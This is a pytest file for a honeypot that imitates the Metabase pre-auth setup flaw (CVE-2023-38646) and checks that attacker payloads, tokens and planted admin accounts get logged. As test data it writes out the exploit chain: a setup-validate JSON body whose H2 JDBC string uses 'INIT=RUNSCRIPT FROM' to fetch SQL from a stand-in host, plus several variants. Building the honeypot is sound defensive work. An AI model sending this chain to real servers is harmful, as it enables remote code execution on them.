"""Pre-auth setup chain on the analytics-dashboard surface (CVE-2023-38646).

The value of this trap is entirely in the second request, so the tests are
weighted accordingly. Three things are pinned:

  * the properties document carries a token that is shaped like the real
    field and is unique per calling address, because a client that
    validates the shape before spending a second request would otherwise
    stop at step one;
  * the validation route extracts the operator's payload-hosting URL out of
    the JDBC connection string — this is the artifact the trap exists to
    produce, and it is verified by posting a chain body and reading the log,
    not by asserting on a substring of the renderer;
  * token provenance discriminates. A token minted for one address and
    replayed from another must read `-foreign`, so the tests replay one and
    assert the tag flips.

Nothing credential-shaped here is fixed: the token is derived per address
from a per-process secret.
"""
import json

import pytest

from flux import server as tbenv

from .test_server import _log_entries, flux_client  # noqa: F401


# The published chain: read the token, then post it back wrapped around an
# H2 JDBC URL whose INIT clause fetches SQL from the caller's own host.
PAYLOAD_HOST = "http://198.51.100.77:8080/poc.sql"


def _chain_body(token, db=None):
    return json.dumps({
        "token": token,
        "details": {
            "is_on_demand": False,
            "is_full_sync": False,
            "is_sample": False,
            "cache_ttl": None,
            "refingerprint": False,
            "auto_run_queries": True,
            "schedules": {},
            "details": {
                "db": db or (
                    "zip:/app/metabase.jar!/sample-database.db"
                    ";MODE=MSSQLServer"
                    f";INIT=RUNSCRIPT FROM '{PAYLOAD_HOST}'"
                ),
                "advanced-options": False,
                "ssl": True,
            },
            "name": "x",
            "engine": "h2",
        },
    })


def _rows(client, tag):
    return [e for e in _log_entries(client.log_path) if e.get("result") == tag]


# -------------------------------------------------------------- step 1: read

@pytest.mark.asyncio
async def test_properties_is_served_as_json(flux_client):  # noqa: F811
    resp = await flux_client.get("/api/session/properties")
    assert resp.status == 200
    assert resp.headers["Content-Type"].startswith("application/json")
    doc = json.loads(await resp.text())
    assert doc["setup-token"]
    # A live setup token alongside a provisioned admin is a state the real
    # product cannot be in, and the inconsistency is what a careful client
    # would notice.
    assert doc["has-user-setup"] is False
    assert "h2" in doc["engines"]


@pytest.mark.asyncio
async def test_setup_token_is_uuid_shaped(flux_client):  # noqa: F811
    doc = json.loads(await (await flux_client.get("/api/session/properties")).text())
    token = doc["setup-token"]
    parts = token.split("-")
    assert [len(p) for p in parts] == [8, 4, 4, 4, 12]
    assert all(c in "0123456789abcdef" for p in parts for c in p)


def test_setup_token_is_not_a_fixed_literal():
    """Per-address, per-process. Two addresses must not share a token, and
    the value must not be greppable out of the source."""
    a = tbenv._metabase_setup_token("203.0.113.5")
    b = tbenv._metabase_setup_token("203.0.113.6")
    assert a != b
    assert a == tbenv._metabase_setup_token("203.0.113.5")  # stable per address
    assert a not in tbenv.render_metabase_session_properties("x", "s").decode()


@pytest.mark.asyncio
async def test_properties_logs_the_token_short_form(flux_client):  # noqa: F811
    await flux_client.get("/api/session/properties")
    row = _rows(flux_client, "metabase-session-properties")[-1]
    assert len(row["metabaseSetupTokenShort"]) == 8


@pytest.mark.asyncio
async def test_properties_rejects_post_with_allow(flux_client):  # noqa: F811
    resp = await flux_client.post("/api/session/properties", data=b"{}")
    assert resp.status == 405
    assert resp.headers["Allow"] == "GET, HEAD"


# ------------------------------------------------- step 2: the payload post

@pytest.mark.asyncio
async def test_validate_captures_the_runscript_url(flux_client):  # noqa: F811
    """The whole point. Verified by walking the chain — read the token the
    server actually served, post it back, and read the URL out of the log."""
    doc = json.loads(await (await flux_client.get("/api/session/properties")).text())
    resp = await flux_client.post(
        "/api/setup/validate", data=_chain_body(doc["setup-token"]))
    assert resp.status == 400

    row = _rows(flux_client, "metabase-setup-validate")[-1]
    assert row["metabaseInitScriptUrl"] == PAYLOAD_HOST
    assert row["metabaseEngine"] == "h2"
    assert row["metabaseJdbcMode"] == "MSSQLServer"
    assert row["metabaseTokenMatched"] is True
    assert "sample-database.db" in row["metabaseJdbcDb"]


@pytest.mark.asyncio
async def test_validate_response_looks_like_a_rejected_connection(flux_client):  # noqa: F811
    """A caller that gets an unexpected success stops. The 400 is what keeps
    the next attempt, with a different payload host, coming."""
    resp = await flux_client.post("/api/setup/validate", data=_chain_body("x"))
    assert resp.status == 400
    assert "db" in json.loads(await resp.text())["errors"]


@pytest.mark.asyncio
async def test_foreign_token_is_tagged_separately(flux_client):  # noqa: F811
    """A well-formed token this process did not mint for this address."""
    foreign = tbenv._metabase_setup_token("192.0.2.254")
    await flux_client.post("/api/setup/validate", data=_chain_body(foreign))
    rows = _rows(flux_client, "metabase-setup-validate-foreign")
    assert rows, "a token minted for another address must not read as self"
    assert rows[-1]["metabaseTokenMatched"] is False
    assert rows[-1]["metabaseInitScriptUrl"] == PAYLOAD_HOST


@pytest.mark.asyncio
async def test_self_and_foreign_discriminate(flux_client):  # noqa: F811
    """The discriminator is shown to discriminate: the same body, with the
    served token versus another address's token, lands on different tags."""
    doc = json.loads(await (await flux_client.get("/api/session/properties")).text())
    await flux_client.post("/api/setup/validate", data=_chain_body(doc["setup-token"]))
    await flux_client.post(
        "/api/setup/validate",
        data=_chain_body(tbenv._metabase_setup_token("192.0.2.1")))
    tags = [e["result"] for e in _log_entries(flux_client.log_path)
            if str(e.get("result", "")).startswith("metabase-setup-validate")]
    assert "metabase-setup-validate" in tags
    assert "metabase-setup-validate-foreign" in tags


@pytest.mark.asyncio
async def test_validate_without_a_token_is_its_own_tag(flux_client):  # noqa: F811
    await flux_client.post("/api/setup/validate", data=json.dumps(
        {"details": {"engine": "h2", "details": {"db": "jdbc:h2:mem:"}}}))
    rows = _rows(flux_client, "metabase-setup-validate-untokened")
    assert rows and rows[-1]["metabaseTokenMatched"] is False


@pytest.mark.asyncio
async def test_validate_records_a_non_json_body_as_such(flux_client):  # noqa: F811
    """A caller posting something other than the published shape is running
    different tooling, which is worth being able to tell."""
    await flux_client.post("/api/setup/validate", data=b"db=jdbc:h2:mem:&token=x")
    row = [e for e in _log_entries(flux_client.log_path)
           if str(e.get("result", "")).startswith("metabase-setup-validate")][-1]
    assert row["metabaseBodyParsed"] is False


@pytest.mark.asyncio
async def test_validate_reads_a_flat_body_shape_too(flux_client):  # noqa: F811
    """Variants post the connection details flat rather than nested."""
    await flux_client.post("/api/setup/validate", data=json.dumps({
        "token": "t", "engine": "h2",
        "db": f"jdbc:h2:mem:test;INIT=RUNSCRIPT FROM '{PAYLOAD_HOST}'",
    }))
    row = [e for e in _log_entries(flux_client.log_path)
           if str(e.get("result", "")).startswith("metabase-setup-validate")][-1]
    assert row["metabaseInitScriptUrl"] == PAYLOAD_HOST


@pytest.mark.asyncio
async def test_runscript_match_is_case_insensitive(flux_client):  # noqa: F811
    await flux_client.post("/api/setup/validate", data=_chain_body(
        "t", db=f"jdbc:h2:mem:x;init=runscript from \"{PAYLOAD_HOST}\""))
    row = [e for e in _log_entries(flux_client.log_path)
           if str(e.get("result", "")).startswith("metabase-setup-validate")][-1]
    assert row["metabaseInitScriptUrl"] == PAYLOAD_HOST


@pytest.mark.asyncio
async def test_absent_fields_are_absent_not_empty(flux_client):  # noqa: F811
    """A missing key must mean the caller did not send it."""
    await flux_client.post("/api/setup/validate", data=json.dumps({"token": "t"}))
    row = [e for e in _log_entries(flux_client.log_path)
           if str(e.get("result", "")).startswith("metabase-setup-validate")][-1]
    assert "metabaseInitScriptUrl" not in row
    assert "metabaseJdbcDb" not in row


# ----------------------------------------------- step 3: planted administrator

@pytest.mark.asyncio
async def test_setup_captures_the_planted_admin_address(flux_client):  # noqa: F811
    """An operator who plants an administrator picks an address they can
    read, which makes it the most durable identifier in the exchange."""
    await flux_client.post("/api/setup", data=json.dumps({
        "token": "t",
        "user": {"email": "root@attacker.invalid", "password": "Hunter2!x",
                 "first_name": "a", "last_name": "b"},
        "prefs": {"site_name": "pwned", "allow_tracking": False},
    }))
    row = [e for e in _log_entries(flux_client.log_path)
           if str(e.get("result", "")).startswith("metabase-setup-admin")][-1]
    assert row["metabaseAdminEmail"] == "root@attacker.invalid"
    assert row["metabaseAdminHasPassword"] is True
    assert row["metabaseAdminSiteName"] == "pwned"


@pytest.mark.asyncio
async def test_planted_password_is_never_logged(flux_client):  # noqa: F811
    secret = "SuperSecret123!"
    await flux_client.post("/api/setup", data=json.dumps({
        "token": "t", "user": {"email": "a@b.invalid", "password": secret}}))
    assert secret not in flux_client.log_path.read_text()


@pytest.mark.asyncio
async def test_planted_pair_gets_a_stable_identity_hash(flux_client):  # noqa: F811
    """So analysis can ask whether a pair planted here turns up elsewhere,
    without the log ever holding the pair."""
    body = json.dumps({"token": "t",
                       "user": {"email": "a@b.invalid", "password": "p"}})
    await flux_client.post("/api/setup", data=body)
    await flux_client.post("/api/setup", data=body)
    rows = [e for e in _log_entries(flux_client.log_path)
            if str(e.get("result", "")).startswith("metabase-setup-admin")]
    ids = {r["metabaseAdminCredentialId"] for r in rows[-2:]}
    assert len(ids) == 1 and len(ids.pop()) == 32


# ------------------------------------------------------------ step 4: login

@pytest.mark.asyncio
async def test_login_captures_credentials_and_answers_401(flux_client):  # noqa: F811
    resp = await flux_client.post("/api/session", data=json.dumps(
        {"username": "admin@corp.invalid", "password": "Winter2026!"}))
    assert resp.status == 401
    row = _rows(flux_client, "metabase-session-login")[-1]
    assert row["metabaseLoginEmail"] == "admin@corp.invalid"
    assert row["metabaseLoginHasPassword"] is True
    assert "Winter2026!" not in flux_client.log_path.read_text()


# ------------------------------------------------------- routing / disabling

@pytest.mark.asyncio
@pytest.mark.parametrize("path", [
    "/api/session/properties", "/api/setup/validate", "/api/setup", "/api/session",
])
async def test_paths_are_claimed(flux_client, path):  # noqa: F811
    method = flux_client.get if path.endswith("properties") else flux_client.post
    resp = await method(path, **({} if path.endswith("properties") else {"data": b"{}"}))
    assert resp.status != 404


@pytest.mark.asyncio
@pytest.mark.parametrize("path", [
    "/api/sessions", "/api/setup/backup", "/api/session/properties/extra",
    "/junk/api/setup", "/api/setupx",
])
async def test_neighbouring_paths_are_not_swallowed(flux_client, path):  # noqa: F811
    """Deliberately narrow. These spellings appear in the wild but are not
    part of this chain, and claiming them would describe a surface the real
    product does not have."""
    assert tbenv.is_metabase_setup_path(path) is False


@pytest.mark.asyncio
async def test_disabled_falls_through_to_404(flux_client, monkeypatch):  # noqa: F811
    monkeypatch.setattr(tbenv, "METABASE_SETUP_ENABLED", False)
    resp = await flux_client.get("/api/session/properties")
    assert resp.status == 404


@pytest.mark.asyncio
async def test_works_without_an_api_key(flux_client, monkeypatch):  # noqa: F811
    """Keyless by design: the token is a synthetic, so there is no upstream
    quota to gate on and a keyless deployment should still capture payloads."""
    monkeypatch.setattr(tbenv, "API_KEY", "")
    resp = await flux_client.get("/api/session/properties")
    assert resp.status == 200
    assert json.loads(await resp.text())["setup-token"]


def test_enabled_by_default():
    assert tbenv.METABASE_SETUP_ENABLED, (
        "HONEYPOT_METABASE_SETUP_ENABLED should default to True — it issues "
        "nothing and spends no upstream quota, and the request that carries "
        "the operator's payload-hosting URL is only ever made when the "
        "properties read before it was answered."
    )
